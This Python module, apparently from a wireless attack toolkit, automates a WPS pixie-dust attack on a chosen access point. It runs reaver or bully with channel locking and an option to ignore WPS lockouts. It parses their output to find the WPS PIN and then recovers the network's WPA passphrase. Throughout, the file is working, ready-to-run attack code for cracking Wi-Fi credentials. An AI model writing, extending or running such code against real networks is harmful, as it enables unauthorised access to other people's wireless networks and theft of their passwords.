# -*- coding: utf-8 -*-
"""WPS pixie-dust attack via reaver (bully fallback).

Adaptive timing (visible on the attack UI):
  BEACON  — soft-bail if no beacon (wrong channel / gone AP)
  ASSOC   — soft-bail if beacon but no associate/M1/pixie exchange
  PIXIE   — full WPS Timeout once the exchange is underway
  GETPSK  — separate PIN→PSK recover (not capped by Rush pixie timeout)

GETPSK: clear reaver .wpc + answer 'n' to session restore so -p does not hang.
"""
import os
import re
import select
import shutil
import subprocess
import time

import config
from attack import interface as iface_mod
from attack import tools
from attack.model import AttackEvent, EventType


PIN_RE = re.compile(
    r"(?:WPS PIN|PIN FOUND|Pin is|setting pin to)\s*:?\s*'?([0-9]{4,8})'?",
    re.I)
PSK_RE = re.compile(
    r"(?:WPA PSK|key is)\s*:?\s*'([^']*)'|(?:WPA PSK)\s*:\s*(\S+)",
    re.I)
FAIL_RE = re.compile(
    r"pin not found|pixie-?dust.*fail|Pixiewps fail|Pixiewps timeout|"
    r"failed to recover WPA key",
    re.I)
# Reaver left -K pixie mode and started online PIN brute-force — abort.
PIN_BF_RE = re.compile(
    r"Trying pin\s+[\"']?\d{4,8}"
    r"|%\s*complete\s*@"
    r"|re-trying last pin"
    r"|Nothing done, nothing to save",
    re.I)
WPS_OFF_RE = re.compile(r"AP seems to have WPS turned off", re.I)
RECOVER_FAIL_RE = re.compile(r"failed to recover WPA key", re.I)
HARD_LOCK_RE = re.compile(
    r"WPS lock(?:out)?|AP (?:is )?locked|WARNING.*(?:WPS )?lock",
    re.I)
BEACON_RE = re.compile(r"Received beacon from", re.I)
# Real WPS exchange progress (not mere "Waiting for beacon").
# Do NOT include "Trying pin" — that is online PIN BF after pixie gave up.
EXCHANGE_RE = re.compile(
    r"Associated with|Received M[1-7]|Starting Pixie|Pixiewps:|"
    r"Sending EAPOL|EAPOL start",
    re.I)
# Pixie-usable progress past endless M1/identity loops.
PIXIE_PROGRESS_RE = re.compile(
    r"Received M[3-7]|Starting Pixie|Pixiewps:|WPS PIN|PIN FOUND",
    re.I)

GETPSK_TIMEOUT = 120
# Soft windows (capped by WPS Timeout). Looser than the first Rush cut —
# many APs need a long M1/identity slog before M3/pixie finally lands.
BEACON_SOFT_SEC = 12
ASSOC_SOFT_SEC = 30
# After assoc/M1, wait longer before declaring "no pixie" (was too aggressive).
PIXIE_PROGRESS_SOFT_SEC = 40

_STDBUF = shutil.which("stdbuf") or (
    "/usr/bin/stdbuf" if os.path.exists("/usr/bin/stdbuf") else None)


def _psk_from_line(line):
    m = PSK_RE.search(line)
    if not m:
        return None
    return m.group(1) if m.group(1) is not None else m.group(2)


def _session_paths(bssid):
    raw = (bssid or "").replace(":", "").replace("-", "")
    names = [raw.upper(), raw.lower()]
    paths = []
    for base in ("/var/lib/reaver", "/etc/reaver"):
        for name in names:
            if name:
                paths.append(os.path.join(base, "%s.wpc" % name))
    return paths


def _clear_session(bssid):
    for path in _session_paths(bssid):
        try:
            os.remove(path)
            tools.log("wps: cleared session %s" % path)
        except OSError:
            pass


def _stop_proc(proc):
    if not proc:
        return
    try:
        if proc.stdin:
            try:
                proc.stdin.close()
            except Exception:  # noqa: BLE001
                pass
        proc.terminate()
        proc.wait(timeout=3)
    except Exception:  # noqa: BLE001
        try:
            proc.kill()
        except Exception:  # noqa: BLE001
            pass


def _spawn(cmd, clear_bssid=None):
    if clear_bssid:
        _clear_session(clear_bssid)
    real = list(cmd)
    if _STDBUF and real and "bully" not in os.path.basename(real[0]):
        real = [_STDBUF, "-oL", "-eL"] + real
    tools.log("wps spawn: %s" % " ".join(real))
    proc = subprocess.Popen(
        real, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, bufsize=1, text=True)
    try:
        if proc.stdin:
            proc.stdin.write("n\n")
            proc.stdin.flush()
    except Exception:  # noqa: BLE001
        pass
    return proc


def _drain_psk(proc):
    """Non-blocking-ish drain after the process has been stopped."""
    if not proc or not proc.stdout:
        return None
    try:
        # Process should already be dead; use a short select so we never hang.
        ready, _, _ = select.select([proc.stdout.fileno()], [], [], 0.3)
        if not ready:
            return None
        rest = proc.stdout.read() or ""
    except Exception:  # noqa: BLE001
        return None
    psk = None
    for line in rest.splitlines():
        tools.log("wps drain: %s" % line.strip())
        got = _psk_from_line(line)
        if got is not None:
            psk = got
    return psk


def _build_cmd(tool, mon, target, ignore_locks):
    bssid = target["bssid"]
    channel = str(target.get("channel") or "")
    if tool == "bully":
        cmd = [tools.BULLY, "-b", bssid, "-d", "-v", "3"]
        if channel:
            cmd += ["-c", channel]
        if ignore_locks:
            cmd.append("-L")
        cmd.append(mon)
        return cmd
    cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-K", "1", "-N", "-vv"]
    if channel:
        cmd += ["-c", channel]
    if ignore_locks:
        cmd.append("-L")
    return cmd


def pixie(mon, target, req, emit, stop_flag):
    """Run a WPS pixie-dust attack on one target.

    Returns {"ok","psk","pin","essid","bssid"}.
    """
    bssid = target["bssid"]
    essid = target.get("essid") or bssid
    tool = config.opt_state(req.attack_modes, "WPS Tool", "reaver")
    ignore_locks = config.opt_bool(req.attack_modes, "Ignore Locks", False)
    timeout = config.opt_int(req.timing, "WPS Timeout", 180)
    beacon_soft = min(BEACON_SOFT_SEC, max(3, timeout // 3))
    assoc_soft = min(ASSOC_SOFT_SEC, max(beacon_soft + 5, timeout - 5))
    progress_soft = min(PIXIE_PROGRESS_SOFT_SEC, max(assoc_soft + 5, timeout - 5))

    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
    if not tools.tool_ok(bin_path):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail="%s missing" % tool))
        return {"ok": False, "essid": essid, "bssid": bssid}

    iface_mod.lock_channel(mon, target.get("channel"))
    cmd = _build_cmd(tool, mon, target, ignore_locks)
    tools.log("wps pixie: timeout=%ss beacon=%ss assoc=%ss progress=%ss" % (
        timeout, beacon_soft, assoc_soft, progress_soft))
    try:
        proc = _spawn(cmd, clear_bssid=bssid)
    except Exception as e:  # noqa: BLE001
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail=str(e)[:20]))
        return {"ok": False, "essid": essid, "bssid": bssid}

    start = time.time()
    pin = None
    psk = None
    saw_beacon = False
    saw_exchange = False
    saw_pixie_progress = False
    exchange_at = None
    result = {"ok": False, "essid": essid, "bssid": bssid}
    fd = proc.stdout.fileno()
    try:
        while True:
            if stop_flag and stop_flag.is_set():
                result["cancelled"] = True
                break
            elapsed = time.time() - start
            if elapsed > timeout:
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="timeout"))
                break

            # Soft timeouts — bail dead ends before burning the full window.
            if not saw_beacon and elapsed > beacon_soft:
                tools.log("wps SOFT: no beacon %ss %s" % (beacon_soft, bssid))
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="no beacon"))
                break
            if saw_beacon and not saw_exchange and elapsed > assoc_soft:
                tools.log("wps SOFT: no assoc/exchange %ss %s" % (
                    assoc_soft, bssid))
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="no assoc"))
                break
            if (saw_exchange and not saw_pixie_progress and exchange_at
                    and (time.time() - exchange_at) > progress_soft):
                tools.log("wps SOFT: no M3/pixie %ss %s" % (
                    progress_soft, bssid))
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="no pixie"))
                break

            # Visible phase: BEACON → ASSOC → PIXIE
            if not saw_beacon:
                phase, left, mx = ("BEACON",
                                   max(0, int(beacon_soft - elapsed)),
                                   beacon_soft)
            elif not saw_exchange:
                phase, left, mx = ("ASSOC",
                                   max(0, int(assoc_soft - elapsed)),
                                   assoc_soft)
            elif not saw_pixie_progress:
                # Countdown the progress soft window while stuck on M1/identity.
                gone = time.time() - (exchange_at or start)
                phase, left, mx = ("PIXIE",
                                   max(0, int(progress_soft - gone)),
                                   progress_soft)
            else:
                phase, left, mx = ("PIXIE",
                                   max(0, int(timeout - elapsed)),
                                   timeout)

            ready, _, _ = select.select([fd], [], [], 0.5)
            if not ready:
                emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                                 phase=phase, countdown=left, cd_max=mx,
                                 signal=target.get("signal")))
                continue
            line = proc.stdout.readline()
            if not line:
                break
            line = line.strip()
            if not line:
                continue
            tools.log("wps pixie: %s" % line)

            if BEACON_RE.search(line):
                if not saw_beacon:
                    tools.log("wps: beacon OK %s" % bssid)
                saw_beacon = True
            if EXCHANGE_RE.search(line):
                if not saw_exchange:
                    tools.log("wps: exchange started %s" % bssid)
                    exchange_at = time.time()
                saw_beacon = True
                saw_exchange = True
            if PIXIE_PROGRESS_RE.search(line):
                if not saw_pixie_progress:
                    tools.log("wps: pixie progress %s" % bssid)
                saw_pixie_progress = True
                saw_exchange = True
                saw_beacon = True

            if WPS_OFF_RE.search(line):
                tools.log("wps: WPS off %s" % bssid)
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="wps off"))
                break
            if PIN_BF_RE.search(line):
                tools.log("wps: abort online PIN BF %s" % bssid)
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="no pixie"))
                break

            m = PIN_RE.search(line)
            if m:
                pin = m.group(1)
                saw_pixie_progress = True
                saw_exchange = True
            got = _psk_from_line(line)
            if got is not None:
                psk = got
                saw_pixie_progress = True
                saw_exchange = True
            if psk is not None:
                break
            # Pixie success line (PIN found) — stop before online PIN BF.
            if pin and re.search(r"pixie", line, re.I) and "PIN" in line.upper():
                if not FAIL_RE.search(line):
                    break
            if HARD_LOCK_RE.search(line) and not ignore_locks:
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="wps lock"))
                break
            if FAIL_RE.search(line):
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="no pin"))
                break
            emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                             phase=phase, countdown=left, cd_max=mx,
                             signal=target.get("signal")))
    finally:
        _stop_proc(proc)

    if pin and psk is None and not (stop_flag and stop_flag.is_set()):
        time.sleep(1.5)
        emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                         phase="GETPSK", countdown=GETPSK_TIMEOUT,
                         cd_max=GETPSK_TIMEOUT,
                         signal=target.get("signal")))
        psk = _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
                           tool=tool, ignore_locks=True,
                           timeout=GETPSK_TIMEOUT)

    if psk is not None or pin:
        emit(AttackEvent(EventType.CRACKED, essid=essid, bssid=bssid,
                         credential=psk, pin=pin))
        result = {"ok": True, "psk": psk, "pin": pin,
                  "essid": essid, "bssid": bssid}
    return result


def recover_psk(iface, target, pin, emit, stop_flag=None, timeout=GETPSK_TIMEOUT):
    essid = target.get("essid") or target.get("bssid")
    bssid = target.get("bssid")
    recovered = iface_mod.ensure_external()
    if recovered:
        iface = recovered
    name = iface_mod.iface_name(iface)
    tool = "bully" if (not tools.tool_ok(tools.REAVER)
                       and tools.tool_ok(tools.BULLY)) else "reaver"
    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
    if not tools.tool_ok(bin_path):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail="%s missing" % tool))
        return None
    try:
        with iface_mod.monitor_mode(name) as mon:
            return _recover_psk(mon, target, pin, emit, essid, bssid,
                                stop_flag, timeout=timeout, tool=tool,
                                ignore_locks=True)
    except RuntimeError as e:
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail=str(e)[:20]))
        return None


def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
                 timeout=GETPSK_TIMEOUT, tool="reaver", ignore_locks=False):
    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
    if not tools.tool_ok(bin_path):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail="%s missing" % tool))
        return None
    iface_mod.lock_channel(mon, target.get("channel"))
    if tool == "bully":
        cmd = [tools.BULLY, "-b", bssid, "-p", str(pin), "-d", "-v", "3"]
        if target.get("channel"):
            cmd += ["-c", str(target["channel"])]
        if ignore_locks:
            cmd.append("-L")
        cmd.append(mon)
    else:
        # No -N on recover — some APs need NACKs to finish M7/PSK.
        cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-p", str(pin), "-vv"]
        if target.get("channel"):
            cmd += ["-c", str(target["channel"])]
        if ignore_locks:
            cmd.append("-L")
    try:
        proc = _spawn(cmd, clear_bssid=bssid)
    except Exception:  # noqa: BLE001
        return None
    start = time.time()
    psk = None
    fail_detail = None
    fd = proc.stdout.fileno()
    try:
        while (time.time() - start) < timeout:
            if stop_flag and stop_flag.is_set():
                break
            ready, _, _ = select.select([fd], [], [], 0.5)
            if not ready:
                emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                                 phase="GETPSK",
                                 countdown=max(0, int(timeout - (time.time() - start))),
                                 cd_max=timeout))
                continue
            line = proc.stdout.readline()
            if not line:
                break
            line = line.strip()
            if not line:
                continue
            tools.log("wps psk-recover: %s" % line)
            got = _psk_from_line(line)
            if got is not None:
                psk = got
                break
            if re.search(r"rate limiting", line, re.I):
                continue
            if HARD_LOCK_RE.search(line) and not ignore_locks:
                fail_detail = "wps lock"
                break
            if RECOVER_FAIL_RE.search(line):
                fail_detail = "no psk"
                break
        else:
            fail_detail = fail_detail or "timeout"
    finally:
        # Stop first — never block forever on stdout.read() while reaver lives.
        _stop_proc(proc)
        if psk is None:
            drained = _drain_psk(proc)
            if drained is not None:
                psk = drained
    if psk is None and fail_detail and not (stop_flag and stop_flag.is_set()):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail=fail_detail))
    return psk
